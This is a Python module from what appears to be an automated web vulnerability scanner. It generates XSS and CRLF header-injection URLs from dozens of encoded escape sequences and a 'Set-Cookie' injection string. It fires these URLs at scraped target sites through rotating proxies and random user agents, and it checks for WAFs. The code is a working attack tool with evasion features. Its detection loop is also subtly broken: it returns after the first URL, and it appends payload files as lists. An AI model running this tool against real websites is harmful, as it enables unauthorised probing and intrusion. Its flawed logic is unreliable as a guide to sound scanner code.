#########################################################################################
# XSS Vulnerability testing functions
#########################################################################################
import glob
import random
import re
import sys
import concurrent.futures
import threading

import requests
from termcolor import cprint
from tqdm import tqdm

from utils.web_scraper import scrape_links_from_url
from utils.proxies import round_robin_proxies
from utils.waf_mitigation import waf_detector
from utils.app_config import POTENTIAL_PATHS, USER_AGENTS, VULN_PATHS
from utils.request_manager import inject_params, inject_payload

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    print(
        "Selenium and webdriver_manager modules not found. Please make sure they are installed."
    )
    sys.exit(1)


# Load proxies from file
def load_xss_payload():
    """_summary_
    TODO manage vulnebility type
    Returns:
        _type_: _description_
    """
    payloads = []
    for payload_file in glob.glob("attacks/xss/payloads/*"):
        # Extract the vulnerability type from the filename
        with open(payload_file, "r", errors="ignore") as file:
            # Assuming each file may contain multiple payloads, one per line
            payloads.append([line for line in file.readlines()])
    return payloads


def generate_xss_urls(url):
    """
    Adds payload to the URL and returns a set of parsed URLs
    """
    xss_payloads = load_xss_payload()
    injection = "Set-Cookie:nefcore=crlfsuite;"
    parsed_urls = set()
    verify_param = re.compile(r"=[^?\|&]*")
    is_param = verify_param.search(url)

    # Escape characters
    escape_chars = [
        "%0d",
        "%0a",
        "%0d%20",
        "%0a%20",
        "%3f",
        "%0d%0a",
        "%23%0d",
        "%23%0a",
        "%23%0d%0a",
        "%u000a",
        "%25%30%61",
        "%25%30a",
        "%3f%0d",
        "%3f%0d%0a",
        "%3f%0a",
        "%%0a0a",
        "%u000d",
        "%u0000",
        "%0d%09",
        "%0d%0a%09",
        "%0d%0a%20",
        "%25250a",
        "%250a",
        "%2F..%0d%0a",
        "%2f%2e%2e%0d%0a",
        "%25%30",
        "%2e%2e%2f%0d%0a",
        "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D",
        "%E5%98%8A%E5%98%8D",
        "%e5%98%8a%e5%98%8d%0a",
        "%e5%98%8a%e5%98%8d%0d",
        "%e5%98%8a%e5%98%8d%0d%0a",
        f"\\r",
        f"\\r\\n",
        f"\\r\\t",
        f"\\r\\n\\t",
        f"\\r%20",
        f"\\r\\n%20",
    ]

    # These strings are used before the escape characters
    starting_strings = ["", "crlfsuite", "?crlfsuite=", "#", "__session_start__/"]

    if is_param:
        del starting_strings[2]
        for string in starting_strings:
            for each_escape in escape_chars:
                injected_urls = inject_params(url, string + each_escape + injection)
                for each_injected_url in injected_urls:
                    parsed_urls.add(each_injected_url)

        for payload in xss_payloads:
            _injected = inject_params(url, payload)
            for injected in _injected:
                parsed_urls.add(injected)
    else:
        if not url.endswith("/"):
            url = url + "/"
        else:
            None
        for string in starting_strings:
            for each_escape in escape_chars:
                parsed_urls.add(url + string + each_escape + injection)
        for payload in xss_payloads:
            parsed_urls.add(url + payload)
    total_len = len(parsed_urls)

    return parsed_urls, total_len


def test_xss_target(url, proxy):
    total_parsed_targets = []
    cprint("Intializing Payload Generator...", color="yellow", file=sys.stderr)
    parsed_target = generate_xss_urls(url)
    for each in parsed_target[0]:
        total_parsed_targets.append(each)

    is_waffed = waf_detector(url=url, proxies=proxy)

    if is_waffed:
        cprint(f"WAF detected <!>", color="red", file=sys.stderr)
    else:
        cprint("WAF Status: Offline", color="green", file=sys.stderr)

    for payload_url in total_parsed_targets:
        if payload_url in requests.get(payload_url, proxies=proxy).text:
            return True, payload_url
        else:
            return False, payload_url


def test_vulnerability_xss(proxies):
    """
    Test a list of websites for XSS vulnerability using multithreading and proxies.
    """
    if len(POTENTIAL_PATHS["xss"][1]) > 0:
        proxy_cycle = round_robin_proxies(proxies)
        VULN_PATHS["xss"][1] = []

        # s = Service(ChromeDriverManager().install())
        # driver = webdriver.Chrome(service=s)

        new_urls = []
        headers = {"User-Agent": random.choice(USER_AGENTS)}

        lock = threading.Lock()

        # Now, append a proxy to each task
        number_of_worker = len(proxies)
        search_tasks_with_proxy = []
        for website in POTENTIAL_PATHS["xss"][1]:
            proxy = next(proxy_cycle)
            search_tasks_with_proxy.append({"website": website, "proxy": proxy})

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=number_of_worker
        ) as executor:
            future_to_search = {
                executor.submit(
                    scrape_links_from_url, task["website"], task["proxy"], headers
                ): task
                for task in search_tasks_with_proxy
            }
            for website in tqdm(
                concurrent.futures.as_completed(future_to_search),
                desc=f"Upating links DB for {website}",
                unit="site",
            ):
                with lock:
                    new_urls += website.result()

        # crawl the website for more links TODO

        POTENTIAL_PATHS["xss"][1] += new_urls

        # Now, append a proxy to each task
        number_of_worker = len(proxies)
        search_tasks_with_proxy = []
        for website in POTENTIAL_PATHS["xss"][1]:
            proxy = next(proxy_cycle)
            search_tasks_with_proxy.append({"website": website, "proxy": proxy})

        with concurrent.futures.ThreadPoolExecutor(
            max_workers=number_of_worker
        ) as executor:
            future_to_search = {
                executor.submit(test_xss_target, task["website"], task["proxy"]): task
                for task in search_tasks_with_proxy
            }
            for website in tqdm(
                concurrent.futures.as_completed(future_to_search),
                desc=f"Testing for XSS for {website}",
                unit="site",
            ):
                result, payload_url = website.result()
                if result:
                    VULN_PATHS["xss"][1].append(payload_url)
                    cprint(f"[VULNERABLE XSS] {payload_url}", "green", file=sys.stderr)
                else:
                    cprint(
                        f"[NOT VULNERABLE XSS] {payload_url}", "red", file=sys.stderr
                    )

        # if VULN_PATHS["xss"][1]:
        #     driver.execute_script("window.open('');")
        #     driver.switch_to.window(driver.window_handles[-1])
        #     for vulnerable_url in VULN_PATHS["xss"][1]:
        #         driver.get(vulnerable_url)
    else:
        cprint("No Potential XSS", color="red", file=sys.stderr)
